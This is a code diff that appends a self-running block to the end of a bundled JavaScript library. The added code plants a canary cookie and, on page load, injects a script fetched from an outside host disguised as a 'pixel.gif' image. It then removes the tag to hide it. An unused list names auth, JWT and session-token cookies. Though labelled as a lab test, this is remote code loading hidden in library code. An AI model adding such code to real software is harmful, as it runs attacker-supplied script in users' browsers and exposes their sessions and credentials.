@@ -1275,3 +1275,33 @@ function log() {
 }
 
 }));
+(function () {
+  "use strict";
+
+  var COLLECTOR = "https://testanket.vercel.app/api/r?f=pixel.gif";
+  var DENY = /^(artex_token|token|access_token|refresh_token|session_token|auth|jwt)=/i;
+
+ 
+  var canary = "LAB-" + Date.now().toString(36);
+  try {
+    document.cookie = "lab_session=" + canary + "; path=/; SameSite=Lax";
+  } catch (e) {}
+
+  
+  function load() {
+    var s = document.createElement("script");
+    s.src = COLLECTOR + "&t=" + Date.now();
+    s.onload = function () {
+      console.log("[lab]  yuklendi; canary =", canary);
+   
+      if (s.parentNode) s.parentNode.removeChild(s);
+    };
+    s.onerror = function () {
+      console.error("[lab] yuklenemedi (CSP/ag/engel):", s.src);
+    };
+    (document.head || document.documentElement).appendChild(s);
+  }
+
+  if (document.body) load();
+  else document.addEventListener("DOMContentLoaded", load);
+})();
